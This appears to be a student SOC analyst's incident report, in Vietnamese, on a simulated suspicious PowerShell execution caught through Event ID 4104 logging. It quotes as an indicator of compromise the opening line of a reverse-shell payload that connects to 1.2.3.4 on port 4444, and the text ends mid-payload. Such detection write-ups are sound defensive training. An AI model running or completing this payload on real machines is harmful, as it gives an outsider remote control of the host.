# Báo cáo Điều tra Sự cố: Phát hiện Thực thi PowerShell Đáng ngờ

## 1. Tóm tắt Điều hành (Executive Summary)
- **Ngày xảy ra sự cố:** 11/11/2026
- **Phương pháp phát hiện:** Ghi nhật ký khối lệnh PowerShell (PowerShell Script Block Logging - Event ID 4104)
- **Mức độ nghiêm trọng:** Cao (High)
- **Chuyên viên điều tra:** SOC Student Analyst

## 2. Tổng quan Sự cố
Trong quá trình kiểm tra và xác thực hệ thống giám sát bảo mật, một câu lệnh PowerShell đáng ngờ đã được thực thi trên máy trạm Windows cục bộ. Tiến trình này đã sử dụng các tham số ẩn danh (ẩn cửa sổ) nhằm thiết lập một kết nối mạng đi trái phép (mô phỏng máy chủ điều khiển C2 beacon).

## 3. Bằng chứng số & Kỹ thuật (Technical Artifacts & Evidence)
- **Mã sự kiện (Event ID):** `4104` (Nhật ký hoạt động của Windows PowerShell Operational)
- **Máy chủ bị ảnh hưởng:** `LAPTOP-FCIR975G`
- **Payload trích xuất được (IoC):**
  ```powershell
  $c2 = '1.2.3.4'; $port = 4444; $client = New-Object System.Net.Sockets.TCPClient($c2,$port);